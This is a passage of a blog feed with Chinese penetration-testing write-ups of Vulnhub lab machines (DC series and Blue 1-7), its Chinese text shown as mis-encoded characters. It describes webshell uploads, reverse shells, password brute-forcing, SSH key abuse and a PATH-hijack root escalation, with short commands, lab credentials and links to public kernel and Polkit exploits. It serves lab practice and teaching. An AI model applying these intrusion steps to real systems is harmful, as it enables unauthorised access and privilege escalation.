æ³•è§£å¯†ï¼Œå¦åˆ™å¯ä»¥è§£å¯†é‡æ–°å¯¼å…¥sqlæ–‡ä»¶</p><p><code>mysql -udc7user -pMdR3xOgB7#dW Staff &lt; /home/dc7user/backups/website.sql;</code></p><ul><li><p>ææƒ</p><p>â€‹é€šè¿‡ä¿®æ”¹adminå¯†ç ç™»å½•åå°ï¼Œå¯ä»¥ç¼–è¾‘åšå®¢æˆ–è€…é¡µé¢ã€‚é‚£ä¹ˆç›´æ¥é€‰æ‹©ç¼–è¾‘é¡µé¢å†™å…¥ä¸€ä¸ªæœ¨é©¬ã€‚ä½†æ˜¯éœ€è¦å…ˆå®‰è£…PHPæ¨¡å—ã€‚</p><p>â€‹æœ¨é©¬å†™å…¥åï¼Œè·å¾—www-dataç”¨æˆ·æƒé™</p><p>â€‹<img src="/../images/image-20230225225209155-1686283446326.png" alt="image-20230225225209155"></p><p>ä»å®šæ—¶è„šæœ¬æ‰€å±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„å…¥æ‰‹ï¼Œç”¨æˆ·ç»„ä¸ºwww-dataæƒé™ä¸ºrwxï¼šè¯´æ˜www</p><p>-dataç”¨æˆ·å¯ä»¥å¯¹å…¶è¿›è¡Œè¯»å†™æ‰§è¡Œï¼Œæ‹¥æœ‰è€…ä¸ºrootï¼šè¯´æ˜å…¶è¿è¡Œæ—¶çš„æƒé™ä¸ºrootã€‚æ‰€ä»¥æˆ‘ä»¬å‘å…¶å†™å…¥åå¼¹shellï¼Œç­‰å¾…å…¶æ‰§è¡Œå°±å¯ä»¥è·å¾—rootæƒé™ã€‚</p></li></ul><h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><p><a href="https://blog.csdn.net/q90375412/article/details/127351747">https://blog.csdn.net/q90375412/article/details/127351747</a></p><ul><li>sqlæ³¨å…¥ï¼ˆsqlmapï¼‰</li><li>johnç ´è§£å¯†ç </li><li>åå°æ¨¡æ¿getshell</li><li>exim4ææƒ</li></ul><h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><p><a href="https://blog.csdn.net/m0_65712192/article/details/129250059">https://blog.csdn.net/m0_65712192/article/details/129250059</a></p><p><img src="/../images/image-20230309113640488-1686283446326.png" alt="image-20230309113640488"></p><p>å¯ä»¥å‘ç°sshæœåŠ¡æ˜¯filteredçš„</p><p><img src="/../images/image-20230309115117489-1686283446326.png" alt="image-20230309115117489"></p><p><img src="/../images/image-20230309115144629-1686283446326.png" alt="image-20230309115144629"></p><p><img src="/../images/image-20230309121325288-1686283446326.png" alt="image-20230309121325288"></p><p><img src="/../images/image-20230309121309508-1686283446326.png" alt="image-20230309121309508"></p><p><img src="/../images/image-20230309121245679-1686283446327.png" alt="image-20230309121245679"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--blueç³»åˆ—</title>
      <link href="/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><img src="../../../typora img/image-20230305123445338.png" alt="image-20230305123445338" style="zoom:80%;" /><p><img src="/../images/image-20230305130206056-1686283466992.png" alt="image-20230305130206056"></p><p><img src="/../images/image-20230305130221501-1686283466992.png" alt="image-20230305130221501"></p><p>secret.zipæ²¡æœ‰ç ´è§£å‡ºæ¥ã€‚</p><p>dirseachç›®å½•æ‰«æç»“æœ</p><p><img src="/../images/image-20230305130651336-1686283466992.png" alt="image-20230305130651336"></p><p>è®¿é—®robots.txtä¸­çš„ç½‘å€</p><p><img src="/../images/image-20230305130727097-1686283466992.png" alt="image-20230305130727097"></p><p>æ­Œè¯è¿åœ¨ä¸€èµ·MD5ä¸ºsshå¯†ç ï¼Œæ²¡æˆåŠŸã€‚</p><p>å¦ä¸€ä¸ªç½‘ç«™ä¸º&#x2F;etc&#x2F;dripispowerful.htmlï¼ŒçŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«ï¼Œæ ¹æ®ä¸Šé¢çš„ç›®å½•æ‰«æåªæœ‰ä¸€ä¸ªindex.phpï¼Œå‚æ•°å°è¯•å‹ç¼©åŒ…é‡Œçš„focus  on â€œdripâ€ã€‚</p><p>å°è¯•è®¿é—®index.php?drip&#x3D;&#x2F;etc&#x2F;dripispowerful.htmlï¼Œè·å¾—å¯†ç å’Œä¸¤ä¸ªç”¨æˆ·å</p><p><img src="/../images/image-20230305131636950-1686283466992.png" alt="image-20230305131636950"></p><p>sshç™»å½•</p><p><img src="/../images/image-20230305132010055-1686283466992.png" alt="image-20230305132010055"></p><p>ææƒï¼ˆä¸ä¼šï¼Œçœ‹wpçš„ï¼‰</p><p><img src="/../images/image-20230305133355153-1686283466992.png" alt="image-20230305133355153"></p><p>polkitææƒ<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p><img src="/../images/image-20230305133346301-1686283466992.png" alt="image-20230305133346301"></p><p><img src="/../images/image-20230305133331628-1686283466992.png" alt="image-20230305133331628"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ul><li>ftpåŒ¿åç™»å½•</li><li>wordpressç”¨æˆ·çˆ†ç ´ï¼Œåå°getshell</li><li>sshå¯†é’¥ç™»å½•</li><li>nmapææƒ</li></ul><p><img src="/../images/image-20230304120228644-1686283466993.png" alt="image-20230304120228644"></p><p><img src="/../images/image-20230304120308755-1686283466993.png" alt="image-20230304120308755"></p><p>ftpå­˜åœ¨åŒ¿åç™»å½•ï¼Œç»è¿‡éªŒè¯å‘ç°ftpä¸Šçš„secret.jpgæ— éšå†™ã€‚</p><p><img src="/../images/image-20230304120324693-1686283466993.png" alt="image-20230304120324693"></p><p><img src="/../images/image-20230304120358152-1686283466993.png" alt="image-20230304120358152"></p><p>wpscanç”¨æˆ·æšä¸¾</p><p><img src="/../images/image-20230304121310981-1686283466993.png" alt="image-20230304121310981"></p><p>è¿›è¡Œå¯†ç çˆ†ç ´</p><p><img src="/../images/image-20230304122015951-1686283466993.png" alt="image-20230304122015951"></p><p>è®¿é—®åå°æ—¶è·³è½¬ï¼Œæ·»åŠ hostè®°å½•</p><p><img src="/../images/image-20230304121229221-1686283466993.png" alt="image-20230304121229221"></p><p>è¿›å…¥åå°</p><p>åœ¨ä¸»é¢˜çš„404æ–‡ä»¶ä¸­åŠ å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè®¿é—®è¯¥404æ–‡ä»¶ï¼Œä¼ å…¥åå¼¹shell</p><p><img src="/../images/image-20230304125406319-1686283466993.png" alt="image-20230304125406319"></p><p><img src="/../images/image-20230304125413838-1686283466993.png" alt="image-20230304125413838"></p><p><img src="/../images/image-20230304125353482-1686283466993.png" alt="image-20230304125353482"></p><p>è¿›å…¥å®¶ç›®å½•çœ‹çœ‹</p><p><img src="/../images/image-20230304125605846-1686283466993.png" alt="image-20230304125605846"></p><p>æ— æƒé™ï¼Œå°è¯•ææƒå¤±è´¥</p><p>ä½†æ˜¯è¿˜å­˜åœ¨sshå¯†é’¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†sshç§é’¥ä¸‹è½½åˆ°æœ¬åœ°ï¼Œé€šè¿‡sshç™»å½•åˆ°freddieç”¨æˆ·</p><p>ä½¿ç”¨pythonåœ¨.sshç›®å½•ä¸‹å¼€ä¸€ä¸ªç®€æ˜“æœåŠ¡å™¨ä¾›æœ¬åœ°ä¸‹è½½æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20230304131800088-1686283466993.png" alt="image-20230304131800088"></p><p>æœ¬åœ°ä¸‹è½½ä¸‹æ¥åï¼Œéœ€è¦å°†id_rsaæ”¹ä¸ºåªæœ‰400æƒé™æ‰å¯ä»¥ä½¿ç”¨</p><p><img src="/../images/image-20230304132002887-1686283466993.png" alt="image-20230304132002887"></p><p><img src="/../images/image-20230304132104344-1686283466993.png" alt="image-20230304132104344"></p><p><img src="/../images/image-20230304132257002-1686283466993.png" alt="image-20230304132257002"></p><p><img src="/../images/image-20230304132307798-1686283466993.png" alt="image-20230304132307798"></p><p><img src="/../images/image-20230304132242555-1686283466993.png" alt="image-20230304132242555"></p><p>è¯»å–&#x2F;root&#x2F;root.txtè·å¾—ç¬¬äºŒä¸ªflagÂ·</p><p><img src="/../images/image-20230304132345766-1686283466993.png" alt="image-20230304132345766"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>sshæ—¥å¿—åŒ…å«getshell</li><li>sshå¯†é’¥ç™»å½•</li><li>å‘½ä»¤åŠ«æŒææƒ</li></ul><p><img src="/../images/image-20230304141715650-1686283466994.png" alt="image-20230304141715650"></p><p><img src="/../images/image-20230304141957453-1686283466994.png" alt="image-20230304141957453"></p><p>å‡ ä¸ªç½‘ç«™éƒ½æ˜¯ABABã€‚ã€‚</p><p>wp-adminç›®å½•åªæœ‰ä¸€ä¸ªreadme</p><p><img src="/../images/image-20230304141834709-1686283466994.png" alt="image-20230304141834709"></p><p>æ¶ä½œå‰§ğŸ˜¡</p><p>å›å¤´çœ‹nampçš„é»˜è®¤è„šæœ¬çš„æ‰«æï¼Œå¯ä»¥çœ‹åˆ°robots.txtä¸­ç¦æ­¢äº†ä¸€ä¸ª&#x2F;eventadminsï¼Œè®¿é—®</p><p><img src="/../images/image-20230304142524510-1686283466994.png" alt="image-20230304142524510"></p><p>å†è®¿é—®æç¤ºctrl+aå‘ç°</p><p><img src="/../images/image-20230304142655946-1686283466994.png" alt="image-20230304142655946"></p><p><img src="/../images/image-20230304142745118-1686283466994.png" alt="image-20230304142745118"></p><p>å†è®¿é—®</p><p><img src="/../images/image-20230304142923226-1686283466994.png" alt="image-20230304142923226"></p><p>ä¸€å¼€å§‹æƒ³çš„æ˜¯ç”¨ä¹å¤´è›‡è¿›è¡Œçˆ†ç ´ï¼Œä½†æ˜¯ç”¨æˆ·åªçŸ¥é“rootã€‚</p><p>åé¢å‘ç°ä¸è¡Œï¼Œæƒ³åˆ°æ—¥å¿—çš„ç”¨é€”ï¼Œå°è¯•è¿›è¡Œsshæ—¥å¿—åŒ…å«getshellã€‚</p><p>å› ä¸ºæ—¥å¿—ä¸­ä¼šè®°å½•sshè¿æ¥çš„ç”¨æˆ·å</p><p><img src="/../images/image-20230304165054436-1686283466994.png" alt="image-20230304165054436"></p><p>æ‰€ä»¥</p><p><img src="/../images/image-20230304165131376-1686283466994.png" alt="image-20230304165131376"></p><p>åå¼¹shell</p><p><img src="/../images/image-20230304165152817-1686283466994.png" alt="image-20230304165152817"></p><p><img src="/../images/image-20230304165204015-1686283466994.png" alt="image-20230304165204015"></p><p>è¿™é‡Œå’Œä¸Šä¸€ä¸ªé¶æœºä¸€æ ·ï¼Œå­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ·robertjï¼Œå¹¶ä¸”www-dataæ— æ³•ææƒ</p><p>æŒ‰ç…§ä¸Šä¸€ä¸ªçš„æ€è·¯æŸ¥çœ‹.sshç›®å½•ï¼Œå‘ç°ä¸ºç©º</p><p><img src="/../images/image-20230304165345630-1686283466994.png" alt="image-20230304165345630"></p><p>é€‰æ‹©ç›´æ¥ç”Ÿæˆsshå¯†é’¥</p><img src="../../../typora img/image-20230304175028256.png" alt="image-20230304175028256" style="zoom:80%;" /><p>æŸ¥çœ‹sshé…ç½®æ–‡ä»¶ï¼šåªå…è®¸å¯†é’¥éªŒè¯æ–¹å¼è¿æ¥ï¼Œå¹¶ä¸”ç”¨æ¥éªŒè¯çš„å…¬é’¥ä¸ºauthorized_keys</p><p><img src="/../images/image-20230304171108734-1686283466994.png" alt="image-20230304171108734"></p><p>æ‰€ä»¥éœ€è¦å°†å…¬é’¥id_rsa.pubæ”¹ä¸ºauthorized_keys</p><p>ç„¶åç”¨pythonåœ¨é¶æœºä¸Šå¼€ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œkaliä½¿ç”¨wgetå‘½ä»¤ä¸‹è½½ç§é’¥ï¼Œå¹¶ä¿®æ”¹ç§é’¥æƒé™ï¼Œæœ€åsshç™»å½•</p><p><img src="/../images/image-20230304175249187-1686283466994.png" alt="image-20230304175249187"></p><p>ææƒ</p><p><img src="/../images/image-20230304174502247-1686283466994.png" alt="image-20230304174502247"></p><p>ä¸€å¼€å§‹æƒ³ç”¨stringsæŸ¥çœ‹çš„ï¼Œä½†æ˜¯æ²¡æœ‰å®‰è£…ï¼Œé‚£å°±ç›´æ¥ç”¨ä¸€ä¸‹çœ‹çœ‹</p><p><img src="/../images/image-20230304174629368-1686283466994.png" alt="image-20230304174629368"></p><p>å¯ä»¥çŸ¥é“è¿™ä¸ªå‘½ä»¤å®è´¨ä¸Šæ˜¯æ‰§è¡Œäº†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address</span><br><span class="line">cat /etc/hosts</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬é€‰ä¸€ä¸ªè¿›è¡Œæ„é€ å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; uname</span><br><span class="line">chmod 777 uname </span><br><span class="line">export PATH=/home/robertj:$PATH</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œgetinfoå³å¯</p><p><img src="/../images/image-20230304174854741-1686283466995.png" alt="image-20230304174854741"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><ul><li>miscè·å¾—äººå‘˜ä¿¡æ¯</li><li>ftpçˆ†ç ´</li><li>ftp+syncæœåŠ¡ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ftpæœåŠ¡å™¨æ“ä½œç½‘ç«™æœåŠ¡å™¨ç›®å½•</li><li>sshå¯†é’¥ç™»å½•</li><li>å‘½ä»¤åŠ«æŒææƒ</li></ul><p><img src="/../images/image-20230304191909931-1686283466995.png" alt="image-20230304191909931"></p><p>ç½‘ç«™æ³¨é‡Šè§£ç ï¼Œè®¿é—®å¦ä¸€ä¸ªç½‘ç«™ï¼Œbrainfuckè§£ç ï¼ŒäºŒç»´ç æ‰«ææœ€åå¾—åˆ°å¦‚ä¸‹</p><p><img src="/../images/image-20230304204625662-1686283466995.png" alt="image-20230304204625662"></p><p>æ”¶é›†åˆ°äº†ç½‘ç«™æŠ€æœ¯äººå‘˜çš„åå­—ï¼Œå¯ä»¥å°è¯•çˆ†ç ´ftpå’ŒsshæœåŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure><p>sshæ— æœ</p><p>ftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: luther   password: mypics</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230304210341290-1686283466995.png" alt="image-20230304210341290"></p><p><img src="/../images/image-20230304211248271-1686283466995.png" alt="image-20230304211248271"></p><p>å‘ç°äº†ä¸€ä¸ªç›®å½•ï¼Œç›®å½•åä¸ºhubertæ˜¯æ”¶é›†åˆ°çš„ä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”uidå’Œgidä¸º1001ï¼Œè¯æ˜å…¶æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·ï¼Œæ‰€ä»¥è¯¥ç›®å½•ä¸ºhubertç”¨æˆ·çš„å®¶ç›®å½•ã€‚</p><p>å¦ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨getå‘½ä»¤ä¸‹è½½åˆ°æœ¬åœ°å</p><p><img src="/../images/image-20230304212449213-1686283466995.png" alt="image-20230304212449213"></p><p>å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªåŒæ­¥å®Œæˆçš„æ—¥å¿—ã€‚</p><blockquote><p>æ‰€ä»¥æ ¹æ®è¿™ä¸¤ä¸ªä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æœåŠ¡å™¨ä¼šåŒæ­¥è¿™ä¸ªftpä¸Šçš„æ–‡ä»¶ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ“ä½œhubertç”¨æˆ·çš„å®¶ç›®å½•ã€‚</p></blockquote><p>æˆ‘ä»¬ä½¿ç”¨putå‘½ä»¤ä¸Šä¼ è‡ªå·±çš„å…¬é’¥</p><p><img src="/../images/image-20230304212132365-1686283466995.png" alt="image-20230304212132365"></p><p>éœ€è¦æ³¨æ„å…¬é’¥å</p><p><img src="/../images/image-20230304212209119-1686283466995.png" alt="image-20230304212209119"></p><p>ç„¶åsshè¿æ¥</p><p><img src="/../images/image-20230304212235168-1686283466995.png" alt="image-20230304212235168"></p><p>çœ‹ä¸‹å®¶ç›®å½•æœ‰å•¥</p><p><img src="/../images/image-20230304212842826-1686283466995.png" alt="image-20230304212842826"></p><p>è¯»å–è¿™ä¸ªrootæƒé™çš„pyæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªç½‘ç«™è¢«é»‘å®¢fricaæ”»å‡»äº†ï¼Œå¹¶ä¸”ç•™ä¸‹äº†åé—¨ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå‰é¢å«äººæ¥ä¿®å¤ç½‘ç«™çš„åŸå› ğŸ¤£</p><p>è¿™ä¸ªé»‘å®¢è¿˜å‘Šè¯‰æˆ‘ä»¬ä»–ç•™ä¸‹äº†æ¾æ•£çš„æƒé™ğŸ˜</p><p><img src="/../images/image-20230304212825018-1686283466995.png" alt="image-20230304212825018"></p><p>è®©æˆ‘åº·åº·</p><p><img src="/../images/image-20230304213424178-1686283466995.png" alt="image-20230304213424178"></p><p>è¿™æ¬¡æœ‰stringså‘½ä»¤ï¼ŒæŸ¥çœ‹getinfo</p><p><img src="/../images/image-20230304213618067-1686283466995.png" alt="image-20230304213618067"></p><p>è·Ÿä¸Šä¸€ä¸ªé¶æœºä¸€æ ·</p><p><img src="/../images/image-20230304213721571-1686283466995.png" alt="image-20230304213721571"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="/../images/image-20230305160546454-1686283466995.png" alt="image-20230305160546454"></p><p><img src="/../images/image-20230305163954224-1686283466995.png" alt="image-20230305163954224"></p><p>wpscanç”¨æˆ·æšä¸¾</p><p><img src="/../images/image-20230305160724611-1686283466995.png" alt="image-20230305160724611"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">collins</span><br><span class="line">gill</span><br><span class="line">collins</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure><p>å¯†ç å­—å…¸ç”Ÿæˆ</p><p><img src="/../images/image-20230305162409527-1686283466995.png" alt="image-20230305162409527"></p><blockquote><p>-m 6 æ˜¯å› ä¸ºwordpresså¯†ç æœ€å°‘6ä¸ªå­—ç¬¦</p></blockquote><p>çˆ†ç ´å¯†ç </p><p><img src="/../images/image-20230305162556601-1686283466995.png" alt="image-20230305162556601"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill / interchangeable</span><br></pre></td></tr></table></figure><p>æ™®é€šç”¨æˆ·ï¼Œåå°åªæ‰¾åˆ°ä¸€å¼ å¯ä»¥å›¾ç‰‡DB</p><p><img src="/../images/image-20230305164352862-1686283466996.png" alt="image-20230305164352862"></p><p>åˆ†æè¿™å¼ å›¾ç‰‡</p><p><img src="/../images/image-20230305164731337-1686283466996.png" alt="image-20230305164731337"></p><p><img src="/../images/image-20230305164827742-1686283466996.png" alt="image-20230305164827742"></p><p>å¾—åˆ°sshè´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill 59583hello</span><br></pre></td></tr></table></figure><p>ç™»é™†åå‘ç°</p><p><img src="/../images/image-20230305165100247-1686283466996.png" alt="image-20230305165100247"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lost+foundç›®å½•æ— æƒé™</span><br><span class="line"></span><br><span class="line">å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªkEYFILE</span><br></pre></td></tr></table></figure><p>é€šè¿‡æœç´¢å¾—åˆ°</p><p><img src="/../images/image-20230305165731867-1686283466996.png" alt="image-20230305165731867"></p><p><img src="/../images/image-20230305171048832-1686283466996.png" alt="image-20230305171048832"></p><p>å¯ä»¥ä½¿ç”¨johnè¿›è¡Œç ´è§£ï¼Œæœºå­GPUå¤ªåƒåœ¾äº†ï¼Œç›´æ¥ä»wpæ‹¿åˆ°å¯†ç </p><p>è·å¾—å¯†ç åï¼Œå¯ä»¥ç”¨KeePassè½¯ä»¶<a href="https://sourceforge.net/projects/keepass/%E6%89%93%E5%BC%80%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99">https://sourceforge.net/projects/keepass/æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨çº¿ç½‘ç«™</a></p><p><a href="https://app.keeweb.info/%E6%89%93%E5%BC%80%E3%80%82">https://app.keeweb.info/æ‰“å¼€ã€‚</a></p><p>æ‰“å¼€åå‘ç°6ä¸ªç©ºç™½çš„key</p><p><img src="/../images/image-20230305172848464-1686283466996.png" alt="image-20230305172848464"></p><p>ä¸çŸ¥é“æ‹¿æ¥å¹²å˜›çš„ã€‚ã€‚</p><p>ç»§ç»­ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªkeyfolderï¼Œå¯èƒ½å°±æ˜¯è¦è®©ä¸Šé¢çš„keyæ”¾åœ¨è¿™ä¸ªkeyfolder</p><p>è€Œä¸”ä½¿ç”¨pyps64ç›‘æ§è¿›ç¨‹å‘ç°æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡key.shï¼Œæ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚</p><p><img src="/../images/image-20230305172941445-1686283466996.png" alt="image-20230305172941445"></p><p>ç»æµ‹è¯•å½“åªæœ‰ä¸€ä¸ªæ–‡ä»¶fracturedoceanæ—¶</p><p><img src="/../images/image-20230305174849955-1686283466996.png" alt="image-20230305174849955"></p><p><img src="/../images/image-20230305175028644-1686283466996.png" alt="image-20230305175028644"></p><p>å®šæ—¶è„šæœ¬å†…å®¹</p><p><img src="/../images/image-20230305175728426-1686283466996.png" alt="image-20230305175728426"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="/../images/image-20230307141431844-1686283466996.png" alt="image-20230307141431844"></p><p>åªå¼€æ”¾äº†80ç«¯å£</p><p><img src="/../images/image-20230307141917191-1686283466996.png" alt="image-20230307141917191"></p><p>æç¤ºæˆ‘ä»¬ç›®å½•æ‰«æè¦æ·»åŠ zipç±»å‹ï¼Œè¯´æ˜ç½‘ç«™ç›®å½•åº”è¯¥å­˜åœ¨zipæ–‡ä»¶</p><p>ç›®å½•æ‰«æ</p><p>dirserach</p><p><img src="/../images/image-20230307142511029-1686283466996.png" alt="image-20230307142511029"></p><p>gobuster</p><p><img src="/../images/image-20230307142447064-1686283466996.png" alt="image-20230307142447064"></p><p>è®¿é—®&#x2F;spammerä¸‹è½½å¾—åˆ°spammer.zip</p><p>ä½¿ç”¨johnçˆ†ç ´</p><p><img src="/../images/image-20230307142628410-1686283466997.png" alt="image-20230307142628410"></p><p>è§£å‹å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure><p>è®¿é—®ç½‘ç«™</p><p><img src="/../images/image-20230307141958670-1686283466997.png" alt="image-20230307141958670"></p><p>å°è¯•ç™»å½•è§£å‹å¾—åˆ°çš„ç”¨æˆ·ï¼ŒæˆåŠŸç™»å½•</p><p><img src="/../images/image-20230307142917723-1686283466997.png" alt="image-20230307142917723"></p><p>é€›äº†ä¸€åœˆå‘ç°ï¼Œé¡µé¢ç¼–è¾‘ï¼Œé‚®ç®±æ³„éœ²ï¼Œæ’ä»¶ï¼ˆæ— æ³•åŠ è½½ä½œç½¢ï¼‰ã€‚</p><ul><li><p>ç½‘ç«™é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62)</span><br><span class="line">Last update: 2020-09-13 19:56:06</span><br><span class="line">Site URL: 192.168.2.35/textpattern</span><br><span class="line">Admin URL: 192.168.2.35/textpattern/textpattern</span><br><span class="line">Document root: /var/www</span><br><span class="line">$path_to_site: /var/www/textpattern</span><br><span class="line">Textpattern path: /var/www/textpattern/textpattern</span><br><span class="line">Article URL pattern: messy</span><br><span class="line">Production status: testing</span><br><span class="line">Temporary directory path: /tmp</span><br><span class="line">PHP version: 5.5.38-1~dotdeb+7.1</span><br><span class="line">GD Graphics Library: Unavailable</span><br><span class="line">Server timezone: UTC</span><br><span class="line">Server local time: 2023-03-07 14:40:29</span><br><span class="line">Daylight Saving Time enabled?: 0</span><br><span class="line">Automatically adjust Daylight Saving Time setting?: 1</span><br><span class="line">Time zone (GMT offset in seconds): Asia/BaghdadÂ (10800)</span><br><span class="line">MySQL: 5.5.47-0+deb7u1 ((Debian)) </span><br><span class="line">Database server time: 2023-03-07 08:40:29</span><br><span class="line">Database server time offset: 0 s</span><br><span class="line">Database server timezone: SYSTEM</span><br><span class="line">Database session timezone: SYSTEM</span><br><span class="line">Locale: C</span><br><span class="line">Site / Admin language: en / en</span><br><span class="line">Web server: Apache/2.2.22 (Debian)</span><br><span class="line">Apache version: Apache/2.2.22 (Debian)</span><br><span class="line">PHP server API: apache2handler</span><br><span class="line">RFC 2616 headers: </span><br><span class="line">Server OS: Linux 3.2.0-4-amd64</span><br><span class="line">Admin-side theme: hiveÂ 4.8.3</span><br><span class="line"></span><br><span class="line">Pre-flight check: </span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">New Textpattern version 4.8.8 available for download.Â Help</span><br><span class="line"></span><br><span class="line">DNS lookup failed: 192.168.2.35Â Help</span><br><span class="line"></span><br><span class="line">/var/www/textpattern/textpattern/setup/ still exists.Â Help</span><br><span class="line"></span><br><span class="line">Site URL preference might be incorrect: 192.168.174.159/textpatternÂ Help</span><br><span class="line"></span><br><span class="line">Image directory is not writable: /var/www/textpattern/images</span><br><span class="line">Theme directory is not writable: /var/www/textpattern/themes</span><br><span class="line">Plugin directory is not writable: /var/www/textpattern/textpattern/pluginsÂ Help</span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">.htaccess file contents: </span><br><span class="line">------------------------</span><br><span class="line"># BEGIN Textpattern</span><br><span class="line"></span><br><span class="line">#DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Enable the `FollowSymLinks` option below if it isn&#x27;t already.</span><br><span class="line">    #Options +FollowSymlinks</span><br><span class="line"></span><br><span class="line">    #RewriteBase /relative/web/path/</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f [OR]</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">    RewriteRule ^(.+) - [PT,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !=/favicon.ico</span><br><span class="line">    RewriteRule ^(.*) index.php</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;HTTP:Authorization&#125;  !^$</span><br><span class="line">    RewriteRule .* - [E=REMOTE_USER:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_mime.c&gt;</span><br><span class="line">    AddType image/svg+xml  svg svgz</span><br><span class="line">    AddEncoding gzip       svgz</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># For additional Apache-compatible web server configuration settings to enhance</span><br><span class="line"># site performance and security, we recommend:</span><br><span class="line"># https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess</span><br><span class="line"></span><br><span class="line"># END Textpattern</span><br><span class="line"></span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ </p><p>å¯ä»¥ç›´æ¥ä¸Šä¼ ğŸï¼Œæ— ä»»ä½•é˜²æŠ¤</p><p>æ¼æ´åˆ†æï¼š<a href="https://blog.csdn.net/yun2diao/article/details/92765372">https://blog.csdn.net/yun2diao/article/details/92765372</a></p><p>åå¼¹shell</p><img src="../../../typora img/image-20230307151417930.png" alt="image-20230307151417930" style="zoom:80%;" /></li></ul><p>ææƒ</p><p>ä¸Šä¼ linepeas.shæŸ¥æ‰¾å¯ææƒé¡¹</p><p>è¿™é‡ŒæŸ¥æ‰¾CVE</p><p><img src="/../images/image-20230307153044644-1686283466997.png" alt="image-20230307153044644"></p><p>é€‰æ‹©ä¸€ä¸ªcveè¿›è¡Œææƒï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯è„ç‰›ææƒ<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p><img src="/../images/image-20230307154757476-1686283466997.png" alt="image-20230307154757476"></p><p><img src="/../images/image-20230307154831929-1686283466997.png" alt="image-20230307154831929"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="/../images/image-20230307182708576-1686283466997.png" 